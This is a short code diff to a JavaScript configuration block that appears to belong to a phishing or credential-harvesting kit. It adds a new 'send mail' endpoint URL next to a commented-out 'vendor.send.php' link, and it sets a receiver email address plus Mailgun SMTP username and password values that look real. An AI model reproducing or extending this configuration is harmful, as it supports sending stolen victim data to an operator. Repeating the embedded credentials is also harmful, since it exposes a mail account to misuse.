@@ -17,6 +17,7 @@ const redirectArray = [
 /***********************Send mail php imported url*****************/
 const   
     //link = 'https://remozo.online/Vendor/vendor/vendor.send.php',
+    link = 'https://data412.github.io/vendapp/',
     receiverEmail = 'jamesthom@proton.me',
     SMTPPassword = '890e8560cf6be91d03b105c409191b6a-c50a0e68-80e4fa5f',
     SMTPUsername = 'postmaster@sandbox87be8bd4a6f84afd97f6493ec1b3e641.mailgun.org',
